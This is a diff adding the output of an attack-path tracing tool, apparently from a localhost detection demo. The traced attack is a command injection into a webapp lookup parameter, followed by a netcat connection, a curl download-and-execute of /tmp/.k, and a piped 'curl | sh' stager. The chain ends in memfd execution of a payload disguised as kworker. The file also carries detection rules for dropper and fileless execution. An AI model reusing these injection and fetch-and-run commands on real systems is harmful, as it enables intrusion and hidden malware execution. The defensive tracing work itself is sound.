@@ -1,0 +1,105 @@
+attack path around proc 1995 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  41 nodes shown of 210 reached: 0 files only read on the way (libraries, configuration) and 169 earlier influences off the cause chain left out
+  started under: sudo(1884) <- sudo(1882) <- bash(1512) <- bash(1323) <- sshd-session(1322) <- sshd-session(1217) <- sshd(1214) <- systemd(1)
+
+alerts on this path:
+    +0.000s  R4 net-shell    pid 1963 python (network input from 127.0.0.1:8080 <- 127.0.0.1:46756) started /bin/sh as pid 1995
+    +1.335s  R1 dropper      wrote /tmp/.k (pid 1998 curl), ran it as pid 2001
+    +1.383s  R1 dropper      wrote /memfd:kworker (deleted) (pid 2005 python3), ran it as pid 2006
+    +1.383s  R2 memfd-exec   pid 2006 ran /proc/self/fd/3 as kworker
+    +1.392s  R1 dropper      wrote /var/tmp/.upd-p15demo (pid 2005 python3), ran it as pid 2007
+    +1.392s  R3 deleted-exec pid 2007 ran /proc/self/fd/4 as upd
+
+why it happened: the most recent cause of each step, newest first:
+             proc 1995 sh
+    +0.000s    <-CLONE-- proc 1963 python
+    -0.000s    <-RECV-- sock 127.0.0.1:8080 -> 127.0.0.1:46756
+               <-TCP-- sock 127.0.0.1:46756 -> 127.0.0.1:8080
+    -0.000s    <-SEND-- proc 1994 curl
+    -0.006s    <-CLONE-- proc 1885 bash
+    -0.027s    <-READ-- file (pipe) o:2549
+
+what it led to, in order (time from the start node's first moment):
+    +0.000s  proc 1963 python  --CLONE-->  proc 1995 sh
+    +0.000s  file /usr/bin/dash  --EXECUTE-->  proc 1995 sh  (as /bin/sh)
+    +0.002s  proc 1995 sh  --CLONE-->  proc 1996 getent
+    +0.002s  file /usr/bin/getent  --EXECUTE-->  proc 1996 getent
+    +0.004s  proc 1996 getent  --CONNECT-->  sock 127.0.0.1:36093 -> 127.0.0.53:53
+    +0.004s  proc 1996 getent  --SEND-->  sock 127.0.0.1:36093 -> 127.0.0.53:53  38 bytes
+    +0.004s  sock 127.0.0.1:36093 -> 127.0.0.53:53  --RECV-->  proc 1996 getent  66 bytes
+    +0.004s  proc 1996 getent  --WRITE-->  file (pipe) o:2613  26 bytes
+    +0.005s  file (pipe) o:2613  --READ-->  proc 1963 python  26 bytes
+    +0.005s  proc 1995 sh  --CLONE-->  proc 1997 nc
+    +0.005s  file /usr/bin/nc.openbsd  --EXECUTE-->  proc 1997 nc  (as /usr/bin/nc)
+    +0.010s  proc 1997 nc  --CONNECT-->  sock 127.0.0.1:49124 -> 127.0.0.1:4444
+    +0.010s  sock 127.0.0.1:4444 -> 127.0.0.1:49124  --ACCEPT-->  proc 1959 nc
+    +1.291s  proc 1995 sh  --CLONE-->  proc 1998 curl
+    +1.291s  file /usr/bin/curl  --EXECUTE-->  proc 1998 curl
+    +1.300s  proc 1998 curl  --CONNECT-->  sock 127.0.0.1:57018 -> 127.0.0.1:8000
+    +1.300s  proc 1998 curl  --SEND-->  sock 127.0.0.1:57018 -> 127.0.0.1:8000  79 bytes
+    +1.301s  sock 127.0.0.1:8000 -> 127.0.0.1:57018  --ACCEPT-->  proc 1970 python
+    +1.302s  sock 127.0.0.1:8000 -> 127.0.0.1:57018  --RECV-->  proc 1970 python  79 bytes
+    +1.317s  proc 1970 python  --WRITE-->  file /var/tmp/p15-demo/stager.log  x2  123 bytes
+    +1.317s  proc 1970 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:57018  x47  11807310 bytes
+    +1.317s  sock 127.0.0.1:57018 -> 127.0.0.1:8000  --RECV-->  proc 1998 curl  x119  11807310 bytes
+    +1.317s  file /tmp/.k  --OPEN-->  proc 1998 curl
+    +1.317s  proc 1998 curl  --WRITE-->  file /tmp/.k  x1497  11807104 bytes
+    +1.329s  proc 1995 sh  --CLONE-->  proc 2000 chmod
+    +1.330s  file /usr/lib/cargo/bin/coreutils/tee  --EXECUTE-->  proc 2000 chmod  (as /usr/bin/chmod)
+    +1.335s  proc 1995 sh  --CLONE-->  proc 2001 .k
+    +1.335s  file /tmp/.k  --EXECUTE-->  proc 2001 .k
+    +1.338s  proc 2001 .k  --WRITE-->  file (pipe) o:2706  x3  32 bytes
+    +1.339s  file (pipe) o:2706  --READ-->  proc 1963 python  x3  249 bytes
+    +1.339s  proc 1995 sh  --CLONE-->  proc 2002 curl
+    +1.339s  proc 1995 sh  --CLONE-->  proc 2003 sh
+    +1.340s  file /usr/bin/curl  --EXECUTE-->  proc 2002 curl
+    +1.340s  file /usr/bin/dash  --EXECUTE-->  proc 2003 sh  (as /usr/bin/sh)
+    +1.342s  file (pipe) o:2758  --READ-->  proc 2003 sh  563 bytes
+    +1.346s  proc 2002 curl  --CONNECT-->  sock 127.0.0.1:57024 -> 127.0.0.1:8000
+    +1.346s  proc 2002 curl  --SEND-->  sock 127.0.0.1:57024 -> 127.0.0.1:8000  80 bytes
+    +1.346s  sock 127.0.0.1:8000 -> 127.0.0.1:57024  --ACCEPT-->  proc 1970 python
+    +1.346s  sock 127.0.0.1:8000 -> 127.0.0.1:57024  --RECV-->  proc 1970 python  80 bytes
+    +1.347s  proc 1970 python  --SEND-->  sock 127.0.0.1:8000 -> 127.0.0.1:57024  x2  764 bytes
+    +1.347s  sock 127.0.0.1:57024 -> 127.0.0.1:8000  --RECV-->  proc 2002 curl  764 bytes
+    +1.347s  proc 2002 curl  --WRITE-->  file (pipe) o:2758  563 bytes
+    +1.348s  proc 2003 sh  --WRITE-->  file (pipe) o:2761  477 bytes
+    +1.348s  proc 2003 sh  --CLONE-->  proc 2005 python3
+    +1.348s  file /usr/bin/python3.14  --EXECUTE-->  proc 2005 python3  (as /usr/bin/python3)
+    +1.361s  file (pipe) o:2761  --READ-->  proc 2005 python3  477 bytes
+    +1.371s  file /usr/lib/cargo/bin/coreutils/tee  --OPEN-->  proc 2005 python3  x2
+    +1.371s  file /usr/lib/cargo/bin/coreutils/tee  --READ-->  proc 2005 python3  11807104 bytes
+    +1.376s  proc 2005 python3  --WRITE-->  file /memfd:kworker (deleted)  11807104 bytes
+    +1.380s  proc 2005 python3  --CLONE-->  proc 2006 3 [kworker]
+    +1.383s  file /memfd:kworker (deleted)  --EXECUTE-->  proc 2006 3 [kworker]
+    +1.387s  proc 2006 3 [kworker]  --WRITE-->  file (pipe) o:2706  x5  107 bytes
+    +1.388s  file /var/tmp/.upd-p15demo  --OPEN-->  proc 2005 python3  x2
+    +1.392s  proc 2005 python3  --CLONE-->  proc 2007 4 [upd]
+    +1.392s  file /var/tmp/.upd-p15demo  --EXECUTE-->  proc 2007 4 [upd]
+    +1.395s  proc 2007 4 [upd]  --WRITE-->  file (pipe) o:2706  x5  110 bytes
+    +1.404s  proc 1963 python  --WRITE-->  file /var/tmp/p15-demo/webapp.log  265 bytes
+    +1.404s  proc 1963 python  --SEND-->  sock 127.0.0.1:8080 -> 127.0.0.1:46756  x2  144 bytes
+    +1.404s  sock 127.0.0.1:46756 -> 127.0.0.1:8080  --RECV-->  proc 1994 curl  144 bytes
+             sock 127.0.0.1:46756 -> 127.0.0.1:8080  ==TCP==  sock 127.0.0.1:8080 -> 127.0.0.1:46756  (one connection, joined by sequence number)
+             sock 127.0.0.1:49124 -> 127.0.0.1:4444  ==TCP==  sock 127.0.0.1:4444 -> 127.0.0.1:49124  (one connection, joined by sequence number)
+             sock 127.0.0.1:57018 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:57018  (one connection, joined by sequence number)
+             sock 127.0.0.1:57024 -> 127.0.0.1:8000  ==TCP==  sock 127.0.0.1:8000 -> 127.0.0.1:57024  (one connection, joined by sequence number)
+
+the processes, in full:
+  proc 1885 bash (bash tools/demo/run_demo.sh /var/tmp/p15-demo)
+  proc 1959 nc (nc -l 127.0.0.1 4444)
+  proc 1963 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)
+  proc 1970 python (/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager)
+  proc 1994 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)
+  proc 1995 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+  proc 1996 getent (getent hosts localhost)
+  proc 1997 nc (nc -w1 127.0.0.1 4444)
+  proc 1998 curl (curl -s http://127.0.0.1:8000/k -o /tmp/.k)
+  proc 2000 chmod (chmod +x /tmp/.k)
+  proc 2001 .k (/tmp/.k)
+  proc 2002 curl (curl -s http://127.0.0.1:8000/s2)
+  proc 2003 sh (sh)
+  proc 2005 python3 (python3 -)
+  proc 2006 3 (kworker)
+  proc 2007 4 (upd)
+
+HTML: /var/tmp/p15-demo/attack-path.html
